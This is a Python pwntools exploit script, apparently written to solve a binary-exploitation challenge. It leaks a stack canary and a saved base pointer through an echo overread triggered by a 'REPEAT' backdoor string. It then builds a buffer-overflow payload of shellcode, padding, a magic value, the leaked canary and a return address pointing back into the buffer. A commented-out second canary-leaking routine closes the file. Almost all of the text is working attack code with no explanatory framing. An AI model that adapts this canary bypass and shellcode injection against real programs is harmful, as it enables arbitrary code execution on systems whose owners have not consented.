from pwn import * 
from argparse import *

BACKDOOR=b'REPEAT'

def send_in_payload(payload: bytes, proc: process):
    proc.sendline(str(len(payload)).encode())
    proc.clean()
    proc.send(payload)

    try:
        output =  proc.recvuntil(b"You said: ")
        output += proc.recv(len(payload))
        return output
    except EOFError as _:
        proc.interactive()
        exit(1)

recursion_count = 0
def send_in_cyclic_bd(num_of_bytes: bytes, proc: process):
    global recursion_count
    recursion_count += 1
    return send_in_payload(cyclic(num_of_bytes - len(BACKDOOR)) + BACKDOOR, proc)


def get_stack_byte(proc: process):
    byte = proc.recv(1)
    print("Byte: " + str(byte))
    return byte if byte != b'\n' else b'\x00'


def get_canary(args: Namespace):
    while True:
        args.proc = process(args.binary)
        send_in_cyclic_bd(args.buff_size+1, args.proc)
        
        canary = b'\x00'
        for i in range(1, 8):
            canary += get_stack_byte(args.proc)        
            if canary[i] == 0:
                break
        
        if len(canary) == 8:
            print("Got canary: " + hex(u64(canary)))
            return canary

MAGIC=p64(0x4305e4b8e20760d9)
MAGIC_OFFSET=0x10

def get_payload(args: Namespace, proc: process):
    send_in_cyclic_bd(8, proc)
    send_in_cyclic_bd(args.buff_size + 8, proc)

    saved_rbp = proc.recvline()[:-1]
    saved_rbp = u64(saved_rbp.ljust(8, b'\x00'))
    print("Saved rbp: " + hex(saved_rbp))

    buffer_loc = saved_rbp - 2 * args.stack_size - args.buff_size - 8

    print(args.shellcode_str)
    return args.shellcode_asm + \
           cyclic(args.buff_size - len(args.shellcode_asm) - MAGIC_OFFSET) + \
           MAGIC + cyclic(8) + \
           args.canary + cyclic(8) + p64(buffer_loc)









'''
def get_canary(args: Namespace):
    for stack_idx in range(8, args.buff_size, 8):
        args.proc = get_stack_print(stack_idx, args)      
        
        canary = get_stack_byte(args.proc)
        if canary != b'\x00':   
            print("skiping")
            continue

        get_stack_print(stack_idx + 1, args)

        for i in range(1,8):
            canary += get_stack_byte(args.proc)
            if canary[i] == 0:
                stack_idx = 8 
                break
        
        if canary != p64(0) and len(canary) == 8:
            break
        
        proc.close()

    if len(canary) != 8:
        print("No canarie")
        exit(0)

    return canary
'''

